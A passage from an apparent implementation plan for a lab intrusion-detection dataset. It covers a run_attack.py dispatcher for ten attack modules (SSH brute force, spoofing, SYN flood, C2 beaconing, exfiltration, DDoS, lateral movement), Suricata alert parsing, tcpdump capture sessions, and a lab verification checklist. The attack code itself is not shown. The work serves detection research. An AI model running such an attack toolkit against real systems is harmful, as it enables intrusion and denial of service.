    ja3_c2, c2_beacon, exfiltration, ddos, lateral_movement,
)

ATTACKS = {
    "ssh_bruteforce": ssh_bruteforce,
    "port_scan": port_scan,
    "arp_spoof": arp_spoof,
    "dns_spoof": dns_spoof,
    "syn_flood": syn_flood,
    "ja3_c2": ja3_c2,
    "c2_beacon": c2_beacon,
    "exfiltration": exfiltration,
    "ddos": ddos,
    "lateral_movement": lateral_movement,
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="run_attack.py")
    parser.add_argument("attack", choices=sorted(ATTACKS))
    parser.add_argument("--attacker-ip", required=True)
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--out-dir", required=True, type=Path)
    parser.add_argument("--dry-run", action="store_true")
    args, extra = parser.parse_known_args(argv)

    module = ATTACKS[args.attack]
    extra_kwargs = module.parse_extra_args(extra) if hasattr(module, "parse_extra_args") else {}
    record = module.run(
        victim_ip=args.victim_ip,
        attacker_ip=args.attacker_ip,
        out_dir=args.out_dir,
        dry_run=args.dry_run,
        **extra_kwargs,
    )
    print(f"Attack '{args.attack}' finished with status={record.status}")
    return 0 if record.status in ("completed", "dry_run") else 1


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/attacks/test_run_attack_cli.py -v`
Expected: 2 passed

- [ ] **Step 5: Run the FULL attack-toolkit test suite to confirm nothing regressed**

Run: `pytest tests/training/selfcollected/attacks/ -v`
Expected: all tests across Tasks 2-15 pass.

- [ ] **Step 6: Commit**

```bash
git add training/selfcollected/attacks/run_attack.py tests/training/selfcollected/attacks/test_run_attack_cli.py
git commit -m "feat: run_attack.py CLI dispatcher for all 10 attack modules"
```

---

### Task 16: `capture/eve_parser.py`

**Files:**
- Create: `training/selfcollected/capture/__init__.py`
- Create: `training/selfcollected/capture/eve_parser.py`
- Test: `tests/training/selfcollected/capture/__init__.py`
- Test: `tests/training/selfcollected/capture/test_eve_parser.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `parse_alert_windows(eve_path: Path) -> list[tuple[str, str]]`,
  `build_benign_manifest(eve_path: Path, session_start: str, session_end: str) -> dict` —
  used by Task 17's `capture_session.py`.

- [ ] **Step 1: Write the failing tests**

```bash
mkdir -p training/selfcollected/capture tests/training/selfcollected/capture
touch training/selfcollected/capture/__init__.py tests/training/selfcollected/capture/__init__.py
```

Create `tests/training/selfcollected/capture/test_eve_parser.py`:
```python
import json

from training.selfcollected.capture.eve_parser import (
    parse_alert_windows, build_benign_manifest,
)


def _write_eve(tmp_path, events):
    path = tmp_path / "eve.json"
    with path.open("w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")
    return path


def test_parse_alert_windows_only_includes_alert_events(tmp_path):
    eve_path = _write_eve(tmp_path, [
        {"event_type": "flow", "timestamp": "2026-10-22T10:00:00.000000+0000"},
        {"event_type": "alert", "timestamp": "2026-10-22T10:01:00.000000+0000"},
        {"event_type": "alert", "timestamp": "2026-10-22T10:02:00.000000+0000"},
    ])
    windows = parse_alert_windows(eve_path)
    assert len(windows) == 2
    assert windows[0] == ("2026-10-22T10:01:00.000000+0000", "2026-10-22T10:01:00.000000+0000")


def test_parse_alert_windows_returns_empty_list_for_missing_file(tmp_path):
    assert parse_alert_windows(tmp_path / "does_not_exist.json") == []


def test_build_benign_manifest_counts_and_lists_excluded_windows(tmp_path):
    eve_path = _write_eve(tmp_path, [
        {"event_type": "alert", "timestamp": "2026-10-22T10:01:00.000000+0000"},
    ])
    manifest = build_benign_manifest(eve_path, "2026-10-22T10:00:00Z", "2026-10-22T10:10:00Z")
    assert manifest["excluded_count"] == 1
    assert manifest["excluded_windows"] == [
        {"start": "2026-10-22T10:01:00.000000+0000", "end": "2026-10-22T10:01:00.000000+0000"},
    ]
    assert manifest["session_start"] == "2026-10-22T10:00:00Z"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/capture/test_eve_parser.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `eve_parser.py`**

Create `training/selfcollected/capture/eve_parser.py`:
```python
"""Parses Suricata eve.json alert events into exclusion windows for benign-capture labelling.

Used so the benign capture session (§5.2.2) can flag windows that Suricata already
considers malicious, per the calibration exclusion logic in §5.5.2 — this module only
flags them; actual exclusion happens in the training pipeline (Phase 7), not here.
"""

import json
from pathlib import Path


def parse_alert_windows(eve_path: Path) -> list[tuple[str, str]]:
    windows: list[tuple[str, str]] = []
    if not eve_path.exists():
        return windows
    with eve_path.open() as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            event = json.loads(line)
            if event.get("event_type") != "alert":
                continue
            ts = event["timestamp"]
            windows.append((ts, ts))
    return windows


def build_benign_manifest(eve_path: Path, session_start: str, session_end: str) -> dict:
    alert_windows = parse_alert_windows(eve_path)
    return {
        "session_start": session_start,
        "session_end": session_end,
        "excluded_windows": [{"start": s, "end": e} for s, e in alert_windows],
        "excluded_count": len(alert_windows),
    }
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/capture/test_eve_parser.py -v`
Expected: 3 passed

- [ ] **Step 5: Commit**

```bash
git add training/selfcollected/capture/ tests/training/selfcollected/capture/
git commit -m "feat: eve.json alert-window parser for benign-capture exclusion"
```

---

### Task 17: `capture/capture_session.py`

**Files:**
- Create: `training/selfcollected/capture/capture_session.py`
- Test: `tests/training/selfcollected/capture/test_capture_session.py`

**Interfaces:**
- Consumes: `build_benign_manifest` from Task 16; `run` functions from any attack module
  (Tasks 6-14) via the `attack_module` parameter.
- Produces: `new_session_dir(base_dir, label) -> Path`,
  `start_capture(interface, pcap_path) -> subprocess.Popen`,
  `stop_capture(proc, grace_seconds=2.0) -> None`,
  `run_benign_session(base_dir, interface, duration_s, eve_path) -> Path`,
  `run_attack_session(base_dir, interface, attack_module, attack_kwargs, eve_path, settle_s=3.0) -> tuple[Path, AttackRecord]`.

- [ ] **Step 1: Write the failing tests**

Create `tests/training/selfcollected/capture/test_capture_session.py`:
```python
import json
import time

from training.selfcollected.capture.capture_session import (
    new_session_dir, start_capture, stop_capture, run_benign_session, run_attack_session,
)


def test_new_session_dir_creates_a_timestamped_labelled_directory(tmp_path):
    session_dir = new_session_dir(tmp_path, "benign")
    assert session_dir.exists()
    assert session_dir.name.endswith("-benign")
    assert session_dir.parent == tmp_path


def test_start_and_stop_capture_terminates_a_long_running_process_quickly(tmp_path):
    # start_capture() is specified against tcpdump directly; stop_capture()'s
    # termination behaviour is generic, so it's tested here against a plain
    # `sleep` process instead, needing no root/network/tcpdump.
    import subprocess
    proc = subprocess.Popen(["sleep", "100"])
    start = time.monotonic()
    stop_capture(proc, grace_seconds=1.0)
    elapsed = time.monotonic() - start
    assert elapsed < 3
    assert proc.poll() is not None  # process has exited


def test_run_benign_session_writes_pcap_placeholder_and_manifest(tmp_path, monkeypatch):
    eve_path = tmp_path / "eve.json"
    eve_path.write_text(json.dumps({"event_type": "alert", "timestamp": "2026-10-22T10:00:00Z"}) + "\n")

    class _FakeProc:
        def terminate(self):
            pass

        def wait(self, timeout=None):
            pass

    monkeypatch.setattr(
        "training.selfcollected.capture.capture_session.start_capture",
        lambda interface, pcap_path: pcap_path.write_bytes(b"") or _FakeProc(),
    )
    monkeypatch.setattr("time.sleep", lambda s: None)

    session_dir = run_benign_session(tmp_path, "vboxnet0", duration_s=0.1, eve_path=eve_path)
    assert (session_dir / "session.pcap").exists()
    manifest = json.loads((session_dir / "benign_session_manifest.json").read_text())
    assert manifest["excluded_count"] == 1


def test_run_attack_session_wraps_capture_around_one_attack_run(tmp_path, monkeypatch):
    eve_path = tmp_path / "eve.json"
    eve_path.write_text("")

    class _FakeProc:
        def terminate(self):
            pass

        def wait(self, timeout=None):
            pass

    monkeypatch.setattr(
        "training.selfcollected.capture.capture_session.start_capture",
        lambda interface, pcap_path: pcap_path.write_bytes(b"") or _FakeProc(),
    )
    monkeypatch.setattr("time.sleep", lambda s: None)

    class _FakeAttackModule:
        __name__ = "training.selfcollected.attacks.port_scan"

        @staticmethod
        def run(out_dir, **kwargs):
            (out_dir / "attacks.jsonl").write_text('{"attack": "port_scan", "status": "completed"}\n')
            return {"status": "completed", "kwargs_received": kwargs}

    session_dir, record = run_attack_session(
        base_dir=tmp_path,
        interface="vboxnet0",
        attack_module=_FakeAttackModule,
        attack_kwargs={
            "attack_name": "port_scan", "victim_ip": "10.0.0.3", "attacker_ip": "10.0.0.2",
        },
        eve_path=eve_path,
        settle_s=0.0,
    )
    assert (session_dir / "session.pcap").exists()
    assert (session_dir / "attacks.jsonl").exists()
    assert record["status"] == "completed"
    assert record["kwargs_received"] == {"victim_ip": "10.0.0.3", "attacker_ip": "10.0.0.2"}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/training/selfcollected/capture/test_capture_session.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement `capture_session.py`**

Create `training/selfcollected/capture/capture_session.py`:
```python
"""Orchestrates one benign or attack capture session (§5.2.2).

Every session directory ends up with session.pcap + eve.json +
(attacks.jsonl for attack sessions, or benign_session_manifest.json for
benign sessions). This module does not produce labelled flow records —
that is deferred to the flow extractor (Phase 2), out of scope here.
"""

import json
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from training.selfcollected.capture.eve_parser import build_benign_manifest


def new_session_dir(base_dir: Path, label: str) -> Path:
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    session_dir = base_dir / f"{ts}-{label}"
    session_dir.mkdir(parents=True, exist_ok=False)
    return session_dir


def start_capture(interface: str, pcap_path: Path) -> subprocess.Popen:
    return subprocess.Popen(
        ["tcpdump", "-i", interface, "-w", str(pcap_path)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )


def stop_capture(proc: subprocess.Popen, grace_seconds: float = 2.0) -> None:
    proc.terminate()
    try:
        proc.wait(timeout=grace_seconds)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def run_benign_session(base_dir: Path, interface: str, duration_s: float, eve_path: Path) -> Path:
    session_dir = new_session_dir(base_dir, "benign")
    start = _utc_now_iso()
    capture = start_capture(interface, session_dir / "session.pcap")
    time.sleep(duration_s)
    stop_capture(capture)
    end = _utc_now_iso()
    manifest = build_benign_manifest(eve_path, start, end)
    (session_dir / "benign_session_manifest.json").write_text(json.dumps(manifest, indent=2))
    return session_dir


def run_attack_session(
    base_dir: Path,
    interface: str,
    attack_module: Any,
    attack_kwargs: dict,
    eve_path: Path,
    settle_s: float = 3.0,
) -> tuple[Path, Any]:
    attack_name = attack_kwargs.get("attack_name") or getattr(attack_module, "__name__", "attack")
    session_dir = new_session_dir(base_dir, attack_name.rsplit(".", 1)[-1])
    capture = start_capture(interface, session_dir / "session.pcap")
    try:
        kwargs = {k: v for k, v in attack_kwargs.items() if k != "attack_name"}
        record = attack_module.run(out_dir=session_dir, **kwargs)
    finally:
        time.sleep(settle_s)
        stop_capture(capture)
    return session_dir, record
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/training/selfcollected/capture/test_capture_session.py -v`
Expected: 4 passed

- [ ] **Step 5: Run the FULL repo test suite**

Run: `pytest tests/ -v`
Expected: every test from Tasks 2-17 passes, nothing regressed.

- [ ] **Step 6: Commit**

```bash
git add training/selfcollected/capture/capture_session.py tests/training/selfcollected/capture/test_capture_session.py
git commit -m "feat: capture session orchestration (benign and attack sessions)"
```

---

## Manual End-to-End Verification (not part of the automated test suite)

Once all 17 tasks are complete, per the spec's Testing section, run this checklist once against
the live lab (Kali attacker, Ubuntu victim-A, Ubuntu victim-B, all on the VirtualBox host-only
network with promiscuous mode "Allow All"):

1. Start Suricata: `sudo suricata -c nidps/suricata/suricata.yaml -i <host-only-interface> -l <log-dir>`
2. For each of the 10 attacks, run it once via `run_attack.py` (from the host for
   attacker-sourced attacks, or from victim-A for `lateral_movement`), and confirm:
   - `attacks.jsonl` has a sane `start_time`/`end_time` and `status: "completed"`.
   - Suricata's `eve.json` shows an alert for: SSH brute force, port scan, DNS spoofing,
     known-bad JA3, SYN flood.
   - Suricata's `eve.json` shows **no** alert for: ARP spoofing, C2 beaconing, exfiltration,
     DDoS, lateral movement (these are Layer 2/3 targets — their absence here is expected and
     useful information for later evaluation).
3. Run one benign session and confirm `benign_session_manifest.json` is produced with
   `excluded_count: 0` (assuming no attack traffic occurred during that window).
